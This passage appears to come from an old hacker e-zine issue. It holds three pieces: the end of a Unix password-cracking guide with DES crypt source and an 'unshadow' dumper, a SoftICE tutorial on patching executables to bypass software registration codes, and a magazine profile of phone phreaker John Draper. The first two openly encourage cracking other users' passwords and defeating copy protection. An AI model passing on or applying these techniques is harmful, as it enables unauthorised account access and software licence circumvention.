+get somewhere on the Web, usually it is about 1-2 Mb, but Mind that it might
+be different for different countries, as the most people choose the password
+basing on their own language), then you just read entry from passwd and
+start checking it with every word from your dictonary,crypting with the
+current salt it before till you find the equvalent encrypted sequence or
+your dictonary is out, then read the next passwd entry and do the same. On
+big systems with a bunch of users you will get a number of them surely. Of
+course if you know some things about some certain user ( say the name of his
+wife,or
+ his date of birth an  so on.. you can use it as well, b/c many newbies make
+easy-to-remember passwords using their birth dates, phone numbers and stuff
+like that).
+Of course you can add a bunch of different tricks to your password breaker
+to make it more smart (say check every "common password" in you dictonary in
+upper or lower case, or mixing with digits) but remember it will surely
+affect on the speed of your program.  And one last thing: there are alot of
+different programs that are to break/check-weak-passwords on unix systems
+(like Crack) but most of them use the same algorythm.
+ well, here are some source codes which you can find useful while doing your
+breakers, crackers etc.
+ first is the function which encrypts password with standard unix encryption
+algorythm using given salt and password and returns the pointer to encrypted
+passwd.use crypt(password,salt).
+ The second is the source code to unshadow passwd files.
+Good Hack!:-)
+Xiz0L
+
+[ all flames, corrections, comments, or whatever send to 
+fygrave@freenet.bishkek.su
+PGP key is awaliable from pgp servers.Don't hehistate to use it.
+]
+
+this file can be found at
+URL: ftp://security.dsi.unimi.it/pub/security/crypt/code/crypt3.c
+/* @(#) $Revision: 66.2 $ */
+/*LINTLIBRARY*/
+/*
+ * This program implements the
+ * Proposed Federal Information Processing
+ *  Data Encryption Standard.
+ * See Federal Register, March 17, 1975 (40FR12134)
+ */
+
+/*  Lines added to clean up ANSI/POSIX namespace */
+#ifdef _NAMESPACE_CLEAN
+#define setkey _setkey
+#define crypt _crypt
+#define encrypt _encrypt
+#endif
+
+/*
+ * Initial permutation,
+ */
+static char IP[] = {
+	58,50,42,34,26,18,10, 2,
+	60,52,44,36,28,20,12, 4,
+	62,54,46,38,30,22,14, 6,
+	64,56,48,40,32,24,16, 8,
+	57,49,41,33,25,17, 9, 1,
+	59,51,43,35,27,19,11, 3,
+	61,53,45,37,29,21,13, 5,
+	63,55,47,39,31,23,15, 7,
+};
+
+/*
+ * Final permutation, FP = IP^(-1)
+ */
+static char FP[] = {
+	40, 8,48,16,56,24,64,32,
+	39, 7,47,15,55,23,63,31,
+	38, 6,46,14,54,22,62,30,
+	37, 5,45,13,53,21,61,29,
+	36, 4,44,12,52,20,60,28,
+	35, 3,43,11,51,19,59,27,
+	34, 2,42,10,50,18,58,26,
+	33, 1,41, 9,49,17,57,25,
+};
+
+/*
+ * Permuted-choice 1 from the key bits
+ * to yield C and D.
+ * Note that bits 8,16... are left out:
+ * They are intended for a parity check.
+ */
+static char PC1_C[] = {
+	57,49,41,33,25,17, 9,
+	 1,58,50,42,34,26,18,
+	10, 2,59,51,43,35,27,
+	19,11, 3,60,52,44,36,
+};
+
+static char PC1_D[] = {
+	63,55,47,39,31,23,15,
+	 7,62,54,46,38,30,22,
+	14, 6,61,53,45,37,29,
+	21,13, 5,28,20,12, 4,
+};
+
+/*
+ * Sequence of shifts used for the key schedule.
+ */
+static char shifts[] = { 1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1, };
+
+/*
+ * Permuted-choice 2, to pick out the bits from
+ * the CD array that generate the key schedule.
+ */
+static char PC2_C[] = {
+	14,17,11,24, 1, 5,
+	 3,28,15, 6,21,10,
+	23,19,12, 4,26, 8,
+	16, 7,27,20,13, 2,
+};
+
+static char PC2_D[] = {
+	41,52,31,37,47,55,
+	30,40,51,45,33,48,
+	44,49,39,56,34,53,
+	46,42,50,36,29,32,
+};
+
+/*
+ * The C and D arrays used to calculate the key schedule.
+ */
+
+static char C[28];
+static char D[28];
+/*
+ * The key schedule.
+ * Generated from the key.
+ */
+static char KS[16][48];
+
+/*
+ * The E bit-selection table.
+ */
+static char E[48];
+static char e2[] = {
+	32, 1, 2, 3, 4, 5,
+	 4, 5, 6, 7, 8, 9,
+	 8, 9,10,11,12,13,
+	12,13,14,15,16,17,
+	16,17,18,19,20,21,
+	20,21,22,23,24,25,
+	24,25,26,27,28,29,
+	28,29,30,31,32, 1,
+};
+
+/*  Lines added to clean up ANSI/POSIX namespace */
+#ifdef _NAMESPACE_CLEAN
+#undef setkey
+#pragma _HP_SECONDARY_DEF _setkey setkey
+#define setkey _setkey
+#endif
+
+/*
+ * Set up the key schedule from the key.
+ */
+
+void
+setkey(key)
+char	*key;
+{
+	register int i, j, k;
+	int	t;
+
+	/*
+	 * First, generate C and D by permuting
+	 * the key.  The low order bit of each
+	 * 8-bit char is not used, so C and D are only 28
+	 * bits apiece.
+	 */
+	for(i=0; i < 28; i++) {
+		C[i] = key[PC1_C[i]-1];
+		D[i] = key[PC1_D[i]-1];
+	}
+	/*
+	 * To generate Ki, rotate C and D according
+	 * to schedule and pick up a permutation
+	 * using PC2.
+	 */
+	for(i=0; i < 16; i++) {
+		/*
+		 * rotate.
+		 */
+		for(k=0; k < shifts[i]; k++) {
+			t = C[0];
+			for(j=0; j < 28-1; j++)
+				C[j] = C[j+1];
+			C[27] = t;
+			t = D[0];
+			for(j=0; j < 28-1; j++)
+				D[j] = D[j+1];
+			D[27] = t;
+		}
+		/*
+		 * get Ki. Note C and D are concatenated.
+		 */
+		for(j=0; j < 24; j++) {
+			KS[i][j] = C[PC2_C[j]-1];
+			KS[i][j+24] = D[PC2_D[j]-28-1];
+		}
+	}
+
+	for(i=0; i < 48; i++)
+		E[i] = e2[i];
+}
+
+/*
+ * The 8 selection functions.
+ * For some reason, they give a 0-origin
+ * index, unlike everything else.
+ */
+static char S[8][64] = {
+	14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7,
+	 0,15, 7, 4,14, 2,13, 1,10, 6,12,11, 9, 5, 3, 8,
+	 4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0,
+	15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13,
+
+	15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10,
+	 3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5,
+	 0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15,
+	13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9,
+
+	10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8,
+	13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1,
+	13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7,
+	 1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12,
+
+	 7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15,
+	13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9,
+	10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4,
+	 3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14,
+
+	 2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9,
+	14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6,
+	 4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14,
+	11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3,
+
+	12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11,
+	10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8,
+	 9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6,
+	 4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13,
+
+	 4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1,
+	13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6,
+	 1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2,
+	 6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12,
+
+	13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7,
+	 1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2,
+	 7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8,
+	 2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11,
+};
+
+/*
+ * P is a permutation on the selected combination
+ * of the current L and key.
+ */
+static char P[] = {
+	16, 7,20,21,
+	29,12,28,17,
+	 1,15,23,26,
+	 5,18,31,10,
+	 2, 8,24,14,
+	32,27, 3, 9,
+	19,13,30, 6,
+	22,11, 4,25,
+};
+
+/*
+ * The current block, divided into 2 halves.
+ */
+static char L[32], R[32];
+static char tempL[32];
+static char f[32];
+
+/*
+ * The combination of the key and the input, before selection.
+ */
+static char preS[48];
+
+/*  Lines added to clean up ANSI/POSIX namespace */
+#ifdef _NAMESPACE_CLEAN
+#undef encrypt
+#pragma _HP_SECONDARY_DEF _encrypt encrypt
+#define encrypt _encrypt
+#endif
+
+/*
+ * The payoff: encrypt a block.
+ */
+
+void
+encrypt(block, edflag)
+char	*block;
+int	edflag;
+{
+	int	i, ii;
+	register int t, j, k;
+
+	/*
+	 * First, permute the bits in the input
+	 */
+	for(j=0; j < 64; j++)
+		L[j] = block[IP[j]-1];
+	/*
+	 * Perform an encryption operation 16 times.
+	 */
+	for(ii=0; ii < 16; ii++) {
+		i = ii;
+		/*
+		 * Save the R array,
+		 * which will be the new L.
+		 */
+		for(j=0; j < 32; j++)
+			tempL[j] = R[j];
+		/*
+		 * Expand R to 48 bits using the E selector;
+		 * exclusive-or with the current key bits.
+		 */
+		for(j=0; j < 48; j++)
+			preS[j] = R[E[j]-1] ^ KS[i][j];
+		/*
+		 * The pre-select bits are now considered
+		 * in 8 groups of 6 bits each.
+		 * The 8 selection functions map these
+		 * 6-bit quantities into 4-bit quantities
+		 * and the results permuted
+		 * to make an f(R, K).
+		 * The indexing into the selection functions
+		 * is peculiar; it could be simplified by
+		 * rewriting the tables.
+		 */
+		for(j=0; j < 8; j++) {
+			t = 6*j;
+			k = S[j][(preS[t+0]<<5)+
+				(preS[t+1]<<3)+
+				(preS[t+2]<<2)+
+				(preS[t+3]<<1)+
+				(preS[t+4]<<0)+
+				(preS[t+5]<<4)];
+			t = 4*j;
+			f[t+0] = (k>>3)&01;
+			f[t+1] = (k>>2)&01;
+			f[t+2] = (k>>1)&01;
+			f[t+3] = (k>>0)&01;
+		}
+		/*
+		 * The new R is L ^ f(R, K).
+		 * The f here has to be permuted first, though.
+		 */
+		for(j=0; j < 32; j++)
+			R[j] = L[j] ^ f[P[j]-1];
+		/*
+		 * Finally, the new L (the original R)
+		 * is copied back.
+		 */
+		for(j=0; j < 32; j++)
+			L[j] = tempL[j];
+	}
+	/*
+	 * The output L and R are reversed.
+	 */
+	for(j=0; j < 32; j++) {
+		t = L[j];
+		L[j] = R[j];
+		R[j] = t;
+	}
+	/*
+	 * The final output
+	 * gets the inverse permutation of the very original.
+	 */
+	for(j=0; j < 64; j++)
+		block[j] = L[FP[j]-1];
+}
+
+/*  Lines added to clean up ANSI/POSIX namespace */
+#ifdef _NAMESPACE_CLEAN
+#undef crypt
+#pragma _HP_SECONDARY_DEF _crypt crypt
+#define crypt _crypt
+#endif
+
+char *
+crypt(pw, salt)
+char	*pw, *salt;
+{
+	register int i, j, c;
+	int	temp;
+	static char block[66], iobuf[16];
+
+	for(i=0; i < 66; i++)
+		block[i] = 0;
+	for(i=0; (c= *pw) && i < 64; pw++) {
+		for(j=0; j < 7; j++, i++)
+			block[i] = (c>>(6-j)) & 01;
+		i++;
+	}
+
+	setkey(block);
+
+	for(i=0; i < 66; i++)
+		block[i] = 0;
+
+	for(i=0; i < 2; i++) {
+		c = *salt++;
+		iobuf[i] = c;
+		if(c > 'Z')
+			c -= 6;
+		if(c > '9')
+			c -= 7;
+		c -= '.';
+		for(j=0; j < 6; j++) {
+			if((c>>j) & 01) {
+				temp = E[6*i+j];
+				E[6*i+j] = E[6*i+j+24];
+				E[6*i+j+24] = temp;
+			}
+		}
+	}
+
+	for(i=0; i < 25; i++)
+		encrypt(block, 0);
+
+	for(i=0; i < 11; i++) {
+		c = 0;
+		for(j=0; j < 6; j++) {
+			c <<= 1;
+			c |= block[6*i+j];
+		}
+		c += '.';
+		if(c > '9')
+			c += 7;
+		if(c > 'Z')
+			c += 6;
+		iobuf[i+2] = c;
+	}
+	iobuf[i+2] = 0;
+	if(iobuf[1] == 0)
+		iobuf[1] = iobuf[0];
+	return(iobuf);
+}
+
+  
+Now the Unshadow Source Code:
+#include <pwd.h>
+
+main()
+{
+  struct passwd *p;
+  while(p=getpwent())
+  printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, p->pw_passwd,
+  p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);
+}
+
+
+.-==[Basic Cracking by TNSe'97]==============================================-.
+|===[By: TNSe]=[BHM#4]=[15k]=[#08]============================================|
+`-===========================================================================-'
+
+                       Basic Cracking by TNSe^97                 
+                                                     
+ Well, I guess you are reading here to learn about how to get rid of           
+those damn codes on that game, or those idiotic delays on some programs!       
+Then, you are reading the rite place! I'll try to learn you how to use         
+Soft-Ice 95, and give you some examples on how to crack.                       
+                                                                               
+First of all, you will need the following things:                              
+* Soft Ice for Windows 95   (This is the best, drop the rest!)                 
+* A hex editor for files.   (Diskedit.exe, or good ol' PCTools.exe)            
+* Some knowledge of assembly codes.                                            
+* A piece of paper          (For writing down notes... :)                      
+* A pen                     (The paper is useless without ... )                
+* A lot of time                                                                
+* More time                 (Some times... )                                   
+                                                                               
+ First step is to install Soft Ice for Win'95, I'll leave that up to your      
+imagination. Just keep trying. I will recommend that you have at least SOME    
+knowledge of assembly. If you don't, you might get some problems. The one      
+thing I can't help you with, is time. Sorry, but it seems like it still is     
+24 hrs in one day, 60 mins in a hr and 60 secs in a min... (Damn that suxx)    
+                                                                               
+ The next step is to start up Soft Ice. To do that, you must press F8 when     
+it says "Starting Windows 95" (Or whatever it says in different languages),    
+Select option 5, start in MS-DOS mode, and when you get to the dos-prompt,     
+change to the Soft Ice dir (My : C:\SIW95) and type WINICE. What you also      
+might want to do is add the Soft Ice dir to your path (Very recommended,       
+since the rest of the document assumes this...) Now you will probably          
+notice that your machine is working its but off. That is because it is         
+starting Win'95. When you have entered Win'95, go to MS-DOS shell.             
+                                                                               
+ Now comes the fun part. First of all change to the directory of the           
+program you want to crack. Then type DLDR <PROGRAMNAME>. What happens next     
+is that you will get up a screen that Shows a lot of not understandable        
+(for you that is) shit. If someone hasn't changed the configuration, the       
+following should be correct:                                                   
+1. At the top you see the registers. They contain certain data, that           
+   programs manipulate. They are sorta important. They can be changed          
+   by typing "r", and then look for the cursor.                                
+2. Under the registers, you will find some data part. It is useful if          
+   you think you know where in the memory the codes are... You can             
+   change what it is showing by typing "d <adress>".                           
+3. This is the important spot. This is where the code is located.              
+   I recommend typing "code on", then you will see what the different          
+   codes are in numbers. Pressing "t" will follow you through the program      
+   byte by byte, "p" will skip Calls and Ints, so I recommend you use          
+   "p". "x" will make the program run just as it usually does, press "x"       
+   and see for yourself! Now to the part that requires a bit of knowledge      
+   about assembly. The command "a <adress>" can be helpful. It makes it        
+   possible to change an opcode in the middle of the program while it is       
+   running. This makes it possible to change where the program would go        
+   if the code was correct, or if the code was wrong... Another helpful        
+   code is "bpx <adress>". Look at the third or fourth line in the code        
+   window. It probably says something like: (From COMMAND.COM)                 
+                                                                               
+   09E5:0105  BF1B01               MOV DI,011B                                 
+                                                                               
+   Now enter "bpx 0105" and you will see that line get another color than      
+   the others. If you press "x" now, the program will stop every time it       
+   passes this point. Try. It stopped rite? Yeah.                              
+                                                                               
+ Now ... Let's try to hack example one. (To enter write DLDR CRKEXAM1.EXE)     
+First of all, if you understand pascal, look at the source (CRKEXAM1.PAS)      
+and try to understand it. Now... Press "p" until the program asks for the      
+code, and then press enter. Now you will see something like this:              
+               (4)                                                             
+1 ????:00C5  E85EFF                CALL 0026                                   
+2 ????:00C8  08C0                  OR AL,AL   (This line is highlighted)       
+3 ????:00CA  741E                  JZ 00EA                                     
+                                                                               
+As you probably have experienced, the highlighting means that the machine      
+is about to execute that line. Now lets take a closer look at the lines.       
+Line 1 is a call, that means it does something, like (in this example)         
+gets and checks the keyboard input. (CALL 0026 is really the                   
+Function CodeCorrect:Boolean; ) Line 2 is the standard way of checking         
+Boolean Functions. If AL is 0 (FALSE in pascal and C++), which means that      
+the code is not correct, Press "p" and line 3 will be highlighted, and you     
+can see, that the JZ 00EA will be executed. (Because of the JUMP to the        
+right) What we would like to do, is to make the machine give a damn            
+even if the code is wrong or correct. Solution:                                
+(Before you do this, write down the opcodes, see above where you can           
+ find the 4 in parenthesis, write that down, it is important. Here you         
+ would write down : E85EFF 08C0 741E change to E85EFF 08C0 9090)               
+Enter "a 00CA". Then you will get something like this:                         
+????:000000CA    Enter : Nop (NOP = No operation, do nothing, just like        
+????:000000CB NOP                   we want! Good?)                            
+????:000000CC (Just press enter)                                               
+                                                                               
+Now look what we got:                                                          
+1 ????:00C5  E85EFF                CALL 0026                                   
+2 ????:00C8  08C0                  OR AL,AL                                    
+3 ????:00CA  90                    NOP        (This line is highlighted)       
+4 ????:00CA  90                    NOP                                         
+                                                                               
+As you see, we changed the "741E" to "9090". Now Press "x".                    
+Wow ... It worked! (If it didn't, try again... )                               
+                                                                               
+Now, for the easiest part. (Always) Make a backup of the .EXE file.            
+Try: copy crkexam1.exe crkexam1.bak                                            
+        1 file(s) copied                                                       
+We are going to edit the executable. I recommend using one of these programs:  
+Diskedit                                                                       
+PCTools                                                                        
+and some others that I do NOT remember the name of...                          
+... For Diskedit and PCTools you MUST enter MS-DOS MODE and type LOCK          
+(answer yes) before using them...                                              
+Now, enter these programs, and find the file we would like to edit. (In        
+this case CRKEXAM1.EXE) You will get up a silly screen with a lot of hexes     
+and shit. Now find the search option. You will need search for HEX.            
+Find the paper you wrote those numbers on (E85EFF 08C0 741E change to          
+E85EFF 08C0 9090) and search for E85EFF08C0741E, when found, change            
+the 741E to 9090 (Which means NOP NOP, do  nothing) and save.                  
+Now start the file, and see... Whatever you type, you will ALWAYS get into     
+the rest of the program!                                                       
+                                                                               
+ Now... That was example 1... Example 2 is alike, but a bit different...       
+Do as you did on example 1, until it asks for the code. Back to these lines:   
+               (4)                                                             
+1 ????:00C5  E85EFF                CALL 0026                                   
+2 ????:00C8  08C0                  OR AL,AL   (This line is highlighted)       
+3 ????:00CA  741E                  JZ 00EA                                     
+                                                                               
+Pressing "p" now, you will notice that it says "NO JUMP" to the right.         
+It will only jump when the code is correct! Damn... how to do this?            
+Well....                                                                       
+"a 00ca"                                                                       
+????:000000CA JMP 00EA                                                         
+And Voila:                                                                     
+1 ????:00C5  E85EFF                CALL 0026                                   
+2 ????:00C8  08C0                  OR AL,AL                                    
+3 ????:00CA  EB1E                  JMP 00EA   (This line is highlighted)       
+Aha... It will now ALWAYS jump to where it should, if the code was             
+correct! Yippeee... Note on your paper: E85EFF 08C0 741E change to             
+E85EFF 08C0 EB1E. Go do it! Now!                                               
+                                                                               
+ As you have seen on the two previous examples, changing two bytes, even       
+one byte can remove the codes... But remember, this is just the BASICS of       
+cracking... DO NOT EXPECT EVERYTHING TO BE SO EASY AS THIS... hehe             
+But practice helps...                                                          
+                                                                               
+                                                                               
+Helpful hints... (Nice Tricks)                                                 
+                                                                               
+There are a lot of cool commands in Soft Ice. Personally I like the            
+"bpr <adress> <adress>". This command will make you enter Soft Ice             
+every time the program writes or reads to this adress. Good Hint:              
+"bpr b800:0000 b800:1000" will make you enter Soft Ice EVERY time              
+something is written to the screen in text mode...                             
+"bpr a000:0000 a000:ffff" will do the same for Graphics mode.                   
+                                                                               
+Another cool thing is "bpint <intno> <ah=??>". This command                    
+enters Soft Ice every time the program does the interrupt you specified.       
+I'll leave this command up to you and Ralph Browns interrupt list.             
+                                                                               
+If you Ever should be so unlucky to encounter something like this:             
+1 ????:001F  LODSB                                                             
+2 ????:0020  STOSW                                                             
+3 ????:0021  DEC CX                                                            
+4 ????:0022  JNZ 001F                                                          
+5 ????:0024  JMP 00FF 
+                                                         
+You would probably notice that when you press "p" it will continue looping     
+between 1 and 4 for a while. If you are REALLY unlucky, CX might be equal      
+to 0FFFFh. You would then have to press "p" about 250000 times.                
+Solution: enter "bpx 0024" and line 5 will be highlighted, then press "x".     
+Now .. you are on line 5, and all is well. "bpx" means break point on          
+execution. Also... stop executing when you come to line 5.                     
+                                                                               
+After a while, all the breakpoints you have made, can be annoying. You can     
+list them by typing "bl". You can disable them by typing "bd <number>" and     
+enable them again by typing "be <number>". If you just don't need a            
+breakpoint anymore, type "bc <number>". If you accidentally deleted a          
+breakpoint, and want it back, you can look at the breakpoint history,          
+"bh". The guys who made Soft Ice has been thinking a bit ... =).               
+                                                                               
+Another trick is to UNPACK the .EXE files BEFORE editing them. Some .EXE       
+files are crypted or packed, and you will not be able to edit them before      
+you have uncrypted them or unpacked them. Two good programs that I can         
+think of rite now is UNPACK.EXE, PKLITE.EXE, XOE.EXE and UNP.EXE.  There
+are muuuuccchhh more!    
+                                                                               
+                                                        TNSe^97/NS!^FooD       
+
+
+.-==[Cereal Hacker: Legendary inspiration or a has-been?]====================-.
+|===[By: Steve Knopper/IU]=[BHM#4]=[17k]=[#09]================================|
+`-===========================================================================-'
+
+CEREAL HACKER - by Steve Knopper/IU
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+-----------------------------------------------------------------------------
+John Draper aka. Cap'n Crunch - Legendary inspiration or washed-up has-been?
+Cap'n Crunch made a name for himself in the early '70s as one of the pioneer
+phone phreaks. Today he sleeps at a campground, can't get a job and finds
+himself the prey of a new generation of hackers.
+-----------------------------------------------------------------------------
+
+"What?" John Draper whispers, with panic and awe in his voice. He leans
+forward and stares into his Macintosh PowerBook 520. "What?"
+   A gray-haired baby boomer who's making photocopies glances over at Draper,
+a wildeyed man with one front tooth and a scraggly beard. Draper, oblivious
+to everything except his computer screen, begins to shout: "3,672 mail
+messages? Holy fuck. Did I get spammed?"     This Kinko's Copies in Mill
+Valley, Calif. doubles as Draper's office space. Everyday, he plops his
+scratched-up laptop onto the gray desk nest to the free Kinko's phone,
+hitches the wire to his computer jack and logs onto the internet. He
+usually spends a few hours checking e-mail and tinkering with his Web page.
+     But today, a terrible thing has happened.   "Oh, look at that!" he says
+loudly , ignoring the steady flow of Kinko's customers. "They've subscribed
+me to all these mailing lists." The Internet mocks him. His fast and shaking
+fingers flail over the keyboard, but the names of his new mailing lists by
+faster than he can press the delete key. "Welcome to dc-stuff" ... "Welcome
+to drewids news" ... "Welcome to compost" ... "Welcome to scream" ...
+"Welcome to barry-manilow". Draper is totally helpless this summer morning.
+"This is going to take forever," he says.
+   The Kinko's customers are now studiously trying to ignore the homeless
+mans persistent outbursts. They don't know he's a living legend, and
+certainly, Draper, 53, doesn't carry himself as though he were one. In the
+early '70s Draper earned the nickname "Cap'n Crnuch" after discovering that
+a plastic whistle, packaged in a cereal box, was capable of blowing perfect
+2,600-Hz tones. Blowing that same whistle into a phone receiver, a caller
+could make unlimited free phone calls around the block or around the world.
+    Back at Kinko's, Draper repeatedly calls his system operatore for help,
+his voice occasionally devolving into a shaky whine, and frantically tries
+to dlete the offending e-mails. This attack, he says, will cripple his
+attempts to find a job through the Internet.
+    Hackers have declared war on John Draper. He's not sure why, but since
+he put up his Web page last October (www.well.com/user/crunch/), he's begun
+receiving a steady flow of flames. "One said, 'You're just a has-been living
+in the past, you don't deserve to be a hacker,'" recounts Draper, who has
+tried to communicate with some of the e-mailers. The attacks have moved
+beyong being playful - some are even vicious and destructive. Draper says
+hackers have intercepted some of his messages to prospective employers and
+then encouraged them not to hire him. He says hackers have also intercepted
+private correspondence to his attorney and used it for further ridicule. It's
+the hacker eqyivalent of smacking your crotchety grandfather upside the
+head with a newspaper just to hear him yelp.
+   At Kinko's wearing a pink Target T-shirt, blue jeans cut off under the
+knee, socks and tennis shoes, Draper vows revenge. He leaves a voice message
+for a man he thinks is an FBI agent. He tries to alert Internet security
+services. When the busy system operator begins screening calls, Draper leaves
+a half-dozen phone messages. He is outraged and defensive, which is under-
+standable. He is battling an enemy he can't see; worse, he can't figgure out
+why he's even under attack. "So what if I'm a has-been?" he asks. "So what if
+I'm talking about all the things I've done in the past?"
+   In 1976 Draper spent four months in federal prison for wire fraud. He's
+certain the Feds are watching him, so he satus away from illegal phone calls;
+going so far as to include a link on his Web page to a page listing good legal
+deals from legitimate phone companies. Another prison term, he says, could
+put him away for 10 or 15 year: "By then, I'll be 65 or 70 years old. I want
+to live my life!"
+   Five days later an anonymous message appears in the Usenet newsgroup
+news.admin.net_abuse.misc. "Johnny," a Colorado hacker in his early 20s,
+claims responsibility for the "main bomb" against Draper - and similar
+attacks on journalists, the White House, Rush Limbaugh, MTV executives and
+another famous elder hacker, Emmanuel Goldstein. In the lengthy message,
+Johnny writer this about Cap'n Crunch: "You are nothing. You haven't been
+anything for a long time. Quit this pretense of you knowing something about
+current phone systems."
+  Johnny calls a couple of night after the attack to do a telephone interview.
+He's devilishly proud of his attack on the system and listens patiently to an
+account of Drapers' defense of himself. Johnny isn't fazed. Draper, he says,
+has committed an indescribable sin by contacting the FBI. Worse yet, in the
+eyes of working hackers everywhere, he continues to take credit for stuff
+he hasn't done in decades.  "He's gone out of his way to mail quite a few
+hackers saying they're either stupid, lame or he's going to sue them or narc
+them out to the FBI," Johnny says. "That's not exactly in keeping with the
+hacker ethic." By way of response, Draper says the Secret Service is after
+Johnny for spamming the White House and that he had better watch out.
+
+                                 *  *
+
+The 1992 action movie Sneakers opens with two teenagers in 1969 using a
+college campus computer and telephone to mischievously arrange a 25,000$
+Republican Party donation to the Black Panthers. The Police show up and
+capture one of the two hackers, the frightened and nerdy Cosmo. In the film,
+Cosmo turns up years later as a bad guy bent on world domination. The adult
+Cosmo, played by sophisticated Gandhi actor Ben Kingsley, wears impeccable
+suits and slicks back his hair into a distinguished pony tail. Even his
+accent sounds cool. The screenwriters modeled young Cosmo loosely after the
+young Draper - there's a clue early in the movie, when the other teen hacker,
+Robert Redford's character, briefly spells "CRUNCH" during a scrabble game.
+In real life, however, Cap'n Crunch looks nothing like the vouge Kingsley
+character. Draper is homeless and smells as though he hasn't showered in
+days. He becomes obsessed and adamant about trivial things. At a Mill Valley
+sandwich shop, he asks a Hispanic busboy wheter or not the resturant payphone
+accepts incomming calls. The busboy looks confused, and Draper quickly snaps,
+"Do you speak english?" The busboy does, but he was momentarily stunned by
+Draper's random question about the phones.
+    Draper resembles the familiar caricature of God, with flowing beard and
+wavy gray hair - only it's standing on end, energized, as though his finger
+has been stuck in an outlet.
+    He is still a hippe, talking road trips in recent years to the Rainbow
+Family Gathering in Missouri, San Diego, Texas, Australia and Russia. He
+still regrets ignoring a sign to the original Woodstock, which he dis-
+regarded because he hadn't heard of the scheduled bands.
+    In 1990, Draper was diagnosed with a degenerative lumbar disc in his
+back. He spent two years working with a chiropractor and a personal trainer
+and gradually healed. Today, he performs yoga and tai chi, working out
+regularly at a local health club and vlounteering to give friends and
+strangers "energy work" or backrubs. He dances all night at Bay Area rave
+parties at last three times a week. He talks proudly about his stamina and
+how younger people can't keep up with him. But the shiniest sparkle in his
+constantly dilated blue eyes comes when he's telling hacker war stories.
+   The stories made him famous. Every now and then a magazine will recall
+his past glory and stick him in a hacker article. Newsweek once ranked him
+among the top 20 hackers of all time. Earlier this year, Forbes ASAP called
+him "Cap'n Crunch, King of the Phreakers," and the PacificSun, a Nort Bay
+alternative weekly, credited Crunch with being a little guy who outsmarted
+the big companies en route to becoming a "hippie legend." After `Sneakers'
+was released, CBS' "This Morning" put him on the air ("My story is a lot
+more complex and interesting", he told the show). And to interview Draper,
+Art Bell, a natinally syndicated radio talk-show host, crounched on a foam
+mattress beside the phreaker legend inside a campground restroom. His
+"Crunchman" Web page proudly and painstakingly preserves his fascinating
+tales.     "You know," he says, "all this publicity and I still haven't
+been able to find a job." On his web page, he complains: "With all the
+fame I've accumulated, I've never accumulated one red cent for all the
+hassles I've endured in all of this 25-year story."
+   Draper's 25-year story actually began in Alaska when he was an Airman
+Second Class with the U.S. Air Force. He was stationed in a deserted post
+with 60 or 70 other men in the middle of frigid nowhere, marooned from
+women and civilization. He had to come up with something to pass the time,
+so he built a ham radio and became a sort of underground military DJ.
+He also started messing with the phones, using loopholes in the Air Force
+and Alaskan switchboard to make free phone calls home. After his honorable
+discharge, he called the base, spliced his voice into the public address
+system and publicity told the commander where he could go.
+   Later, while working as a National Semiconductor engineer, a blind kid
+named Dennie called crunch, at random, to test some phone tricks. Dennie
+told Draper he was a "phreak" - A slang term that mixes the words "frequently"
+, "phone", "freak", and "free" - and knew 200 different methods of making
+free long distance calls. Draper was intrigued. He met with Deniie one day
+and followed him to a dark room where he was introduced to two other blind
+phreakers. They showed Draper how to pick up a "trunk," or an open phone line,
+and use a musical organ to shoot tones into the receiver. Draper showed
+Dennie a few technical things he'd learned, and the two became friends.
+   Upon returning home that day, Draper shoved his brother off the family
+pioano so he could successfully record the right tones. Shouting, "It works!"
+he rushed back and forth between his room and the piano. "I was bouncing off
+the walls. My dad was just sort of shaking his head like, "What have I raised,
+here?"
+   The blind kids requested that Draper build a "blue box" to mechanically
+create these tones and shoot them into the phones; this box was more
+portable and efficient then an organ, whistle or piano. Draper did just this
+and often took long blue-boxing trips in his Volkswagen van, calling surprised
+friends for free all over the country. Blue-boxing became the cornerstone of
+phreaking - with today's more sophisticated technology, slightly modified
+phone dialers called red boxes are used instead.
